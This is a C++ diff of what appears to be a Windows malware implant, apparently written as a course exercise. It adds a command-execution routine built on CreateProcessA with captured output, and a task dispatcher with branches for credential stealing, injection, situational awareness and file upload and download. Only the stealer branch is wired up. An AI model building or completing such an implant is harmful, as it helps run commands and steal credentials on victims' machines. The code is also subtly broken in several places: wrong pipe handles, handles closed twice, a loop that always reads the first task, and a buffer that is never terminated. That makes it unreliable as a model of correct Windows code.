@@ -2,87 +2,173 @@
 #include <stdio.h>
 #include <minwinbase.h>
 #include "..\nlohmann\json.hpp"
+#include "..\Stealer\stealer.h"
 
 using json = nlohmann::json;
 #define BUF_SIZE 4096
 
 std::string exec(char* program, char* args){
-    LPSTR cmdBuffer = (char *)malloc(1000 * sizeof(char));
-    if (cmdBuffer == NULL){
-        printf("malloc failed");
-        exit(1);
+    int cmdLen = strlen(program) + strlen(args);
+
+    LPSTR parsedCmds = (char *)malloc((cmdLen + 16) * sizeof(char));
+    if (parsedCmds == NULL)
+    {
+        printf("Error allocating memory");
+        return 0;
     }
-    int j = sprintf(cmdBuffer, "cmd.exe /C ");
-    j += sprintf(cmdBuffer + j, program );
-    j += sprintf(cmdBuffer+ j, " ");
-    j += sprintf(cmdBuffer + j, args);
-    j += sprintf(cmdBuffer + j, "\0");
-    
+
+    // Used these docs to understand sprintf https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2013/ybk95axf(v=vs.120)
+    int j;
+    j = sprintf(parsedCmds, program);
+    j += sprintf(parsedCmds + j, " ");
+    j += sprintf(parsedCmds + j, args);
+    j += sprintf(parsedCmds + j, "\0");
     // Declare handles for StdOut
     HANDLE hStdOutRead, hStdOutWrite;
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
-    // Prevent dead squirrels 
+    // Prevent dead squirrels
     ZeroMemory(&pi, sizeof(pi));
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
+    // TODO: Set si.dwFlags...
+    // HINT Read this and look for anything that talks about handle inheritance :-)
+    //  https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+
+    // //your solution here!
+    si.dwFlags |= STARTF_USESTDHANDLES;
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(sa);
     sa.lpSecurityDescriptor = NULL;
-    sa.bInheritHandle = TRUE;
-     si.dwFlags |= STARTF_USESTDHANDLES;
 
-    CreatePipe(&hStdOutRead, &hStdOutWrite, &sa,BUF_SIZE);
+    // TODO: ensure that the child processes can inherit our handles!
+    // //your solution here!
+    sa.bInheritHandle = TRUE;
+
+    // TODO: Create a pipe  object and share the handle with a child processes
+    // //your solution here!
+
+    if (!CreatePipe(
+            &hStdOutRead,
+            &hStdOutWrite,
+            &sa,
+            0))
+    {
+        printf("CreatePipe Failed");
+        printf("%d", GetLastError());
+        return NULL;
+    }
+
+    if (!SetHandleInformation(hStdOutRead, 0x00000001, 0))
+    {
+        printf("Failed to set handle information for hStdOutRead");
+        return NULL;
+    }
+    // TODO: Set
+    // set startupinfo handles
     si.hStdInput = NULL;
-    si.hStdError = hStdOutWrite;
+    si.hStdError = hStdOutRead;
     si.hStdOutput = hStdOutWrite;
+
+    // Create the child Processes and wait for it to terminate!
+    // //your solution here!
+
+    if (!CreateProcessA(
+            NULL,
+            parsedCmds,
+            &sa,
+            &sa,
+            TRUE,
+            0,
+            NULL,
+            NULL,
+            &si,
+            &pi))
+    {
+        printf("Failed CreateProcessA\n");
+        printf("%d", GetLastError());
+        return NULL;
+    }
+
+    char *buffer = (char *)malloc(BUF_SIZE);
+    DWORD totalBytesAvail;
+    LPDWORD lpTotalBytesAvail = &totalBytesAvail;
+    DWORD bytesRead;
+    LPDWORD lpBytesRead = &bytesRead;
+    DWORD exitCode;
+    LPDWORD lpExitCode = &exitCode;
    
-    int retVal = CreateProcessA(    // No module name (use command line)
-        NULL,        // Command line
-        cmdBuffer,
-        NULL,           // Process handle not inheritable
-        NULL,           // Thread handle not inheritable
-        TRUE,          // Set handle inheritance to TRUE binheritance
-        0,              // No creation flags
-        NULL,           // Use parent's environment block
-        NULL,           // Use parent's starting directory 
-        &si,            // Pointer to STARTUPINFO structure
-        &pi ) ;          // Pointer to PROCESS_INFORMATION structure
-    
-    if (retVal == 0){
-        printf("Create process failed\n");
-        exit(0);
-    }
-    char * buff = (char *)malloc(BUF_SIZE);
-    DWORD bytes;
-    LPDWORD lpExitCode;
-    DWORD lpTotalBytesAvail;
-    int ind = 1;
-    while( (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT) || (ind ==1) ){ //check to see if child process is alive
-        ind = 0;
-        //GetExitCodeProcess(pi.hProcess, lpExitCode);
-        PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &lpTotalBytesAvail, NULL);
-        //printf("avail: %d\n", lpTotalBytesAvail);
-        while ((long)lpTotalBytesAvail > 0){
-            //while this value is positive we have something to read
-            ReadFile(hStdOutRead, buff, BUF_SIZE, &bytes, NULL);
-            buff[bytes] = '\0';
-            
-            printf("%s", buff);
-            lpTotalBytesAvail = lpTotalBytesAvail - bytes;
+    while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
+    {
+        PeekNamedPipe(
+            hStdOutRead,
+            NULL,
+            0,
+            NULL,
+            lpTotalBytesAvail,
+            NULL);
+
+        while (*lpTotalBytesAvail > 0)
+        {
+            ReadFile(
+                hStdOutRead,
+                buffer,
+                BUF_SIZE,
+                lpBytesRead,
+                NULL);
+
+            //printf(buffer);
+
+            *lpTotalBytesAvail = *lpTotalBytesAvail - *lpBytesRead;
         }
+
+
     }
-    // Close process and thread handles. 
-    CloseHandle( pi.hProcess );
-    CloseHandle( pi.hThread );
+
+
+    // TODO: perform any cleanup necessary!
+    // The parent processes no longer needs a handle to the child processes, the running thread, or the out file!
+    // //your solution here!
     CloseHandle(hStdOutRead);
     CloseHandle(hStdOutWrite);
+    CloseHandle(hStdOutRead);
+    CloseHandle(hStdOutWrite);
+    free(parsedCmds);
+    return std::string(buffer);
+}
 
-    //free(buff);
-    free(cmdBuffer);
-    return std::string(buff);
+int parseArgs(json response){
+    size_t numTasks = response.array().size();
+    
+    for (int i =0; i < numTasks; i++){
+        std::string command = response.at(0).at("command");
+        std::string args = response.at(0).at("args");
+        if (command.compare("Stealer") == 0){
+            json res = driver();
+            //perform error checking then post
+
+
+        } else if (command.compare("FileExec") == 0){
+
+        } else if (command.compare("SitAware") == 0) {
+
+        } else if (command.compare("FileEnum") == 0){
+
+        } else if (command.compare("Injection") == 0){
+
+        } else if (command.compare("FileUpload") == 0) {
+
+        } else if (command.compare("Filedownload") == 0){
+            
+        } else {
+            printf("NOOOOOOOOO none of the above\n");
+        }
+
+    }
+    
 }
 
 int main(int argc, char* argv[]){
+
 
 }
